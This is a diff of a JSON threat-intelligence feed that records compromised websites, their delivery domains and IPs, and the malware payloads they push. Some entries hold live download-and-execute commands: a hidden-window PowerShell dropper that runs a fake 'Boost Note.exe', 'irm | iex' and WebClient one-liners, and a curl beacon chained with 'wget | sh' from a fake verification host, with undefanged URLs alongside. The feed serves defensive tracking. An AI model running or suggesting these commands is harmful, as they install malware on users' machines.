@@ -1,5 +1,77 @@
 [
   {
+    "UrlDomain": "gokanke.cyou",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwra5awt2gdb0oml2wrx9ac8",
+    "ScannedAt": "2026-11-22T03:31:15.014000+00:00"
+  },
+  {
+    "UrlDomain": "mayflowerpllc.com",
+    "DeliveryUrl": [
+      "quembrixel.com"
+    ],
+    "PayloadUrl": [
+      "https://quembrixel.com/56a61926.exe"
+    ],
+    "IP": [
+      "192.232.223.143"
+    ],
+    "Related": [],
+    "Payload": "powershell -WindowStyle Hidden -Command \"$p=Join-Path $env:PUBLIC '56a61926.exe';(New-Object Net.WebClient).DownloadFile('https://quembrixel[.]com/56a61926.exe',$p);Start-Process $p\"",
+    "ResolvedDownloadUrl": [
+      "https://quembrixel.com/56a61926.exe"
+    ],
+    "ReportId": "cmwra3laa2gaw0omlvjjj9cxj",
+    "ScannedAt": "2026-11-22T03:29:55.133000+00:00"
+  },
+  {
+    "UrlDomain": "ihealthytree.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/5d99abf403611db7",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=3a4cbee7efe202a2084b40f3ee3adb6fe03f042266d1dc97&amp;_v=29921968",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=e3b0c5497ffaae9db82616369a62781a8fbd599720414d4b",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=3a4cbee7efe202a2084b40f3ee3adb6fe03f042266d1dc97&_v=29921968",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/5d99abf403611db7'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/5d99abf403611db7"
+    ],
+    "ReportId": "cmwra2jib2ga20oml2najpclq",
+    "ScannedAt": "2026-11-22T03:29:06.177000+00:00"
+  },
+  {
     "UrlDomain": "startupsteroid.com",
     "DeliveryUrl": [
       "friendsoftorreabbey.com"
@@ -11626,172 +11698,5 @@
     ],
     "ReportId": "cmwha6n200r0k0oml79vcxbid",
     "ScannedAt": "2026-11-15T03:34:35.644000+00:00"
-  },
-  {
-    "UrlDomain": "faizertraders.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "91.108.101.102"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=8483c18e-0d34-477d-a69f-39c2685acc7d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ffaizertraders[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A27%3A30.836Z&lastShellAt=2026-11-15T03%3A27%3A30.836Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwh9zbji0qsf0omly5l7mevq",
-    "ScannedAt": "2026-11-15T03:28:54.109000+00:00"
-  },
-  {
-    "UrlDomain": "achadinhosofertas.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "162.241.203.86"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=472a1878-340d-4637-a873-0423fb4293af&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fachadinhosofertas[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A24%3A22.196Z&lastShellAt=2026-11-15T03%3A24%3A22.196Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwh9v9pi0qrl0omlv4pbinuy",
-    "ScannedAt": "2026-11-15T03:25:45.167000+00:00"
-  },
-  {
-    "UrlDomain": "desrecettesfaciles.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.23"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=9559fe19-51b4-4fcc-9d02-2400bae2d826&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdesrecettesfaciles[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A22%3A23.142Z&lastShellAt=2026-11-15T03%3A22%3A23.142Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwh9sq3h0qmz0omla5uwnjm3",
-    "ScannedAt": "2026-11-15T03:23:46.316000+00:00"
-  },
-  {
-    "UrlDomain": "martinworster.co.uk",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwh9nuke0qe30oml6tbk0se8",
-    "ScannedAt": "2026-11-15T03:19:58.891000+00:00"
-  },
-  {
-    "UrlDomain": "maltepe-haber.xyz",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://frclau.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwh9nozg0qd60oml0fnpuhy7",
-    "ScannedAt": "2026-11-15T03:19:51.677000+00:00"
-  },
-  {
-    "UrlDomain": "kayapinar-haber.com.tr",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "104.21.21.246"
-    ],
-    "Related": [
-      {
-        "Value": "https://frclau.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwh9nfu30qce0oml74xfn289",
-    "ScannedAt": "2026-11-15T03:19:39.750000+00:00"
-  },
-  {
-    "UrlDomain": "bananaexcursions.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "145.14.156.49"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=c0fc2b25-8ccf-4875-ab44-fb9ceb7ad2c3&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbananaexcursions[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A09%3A49.351Z&lastShellAt=2026-11-15T03%3A09%3A49.351Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwh9cl1t0pv80omltzym1oqw",
-    "ScannedAt": "2026-11-15T03:11:13.345000+00:00"
   }
 ]
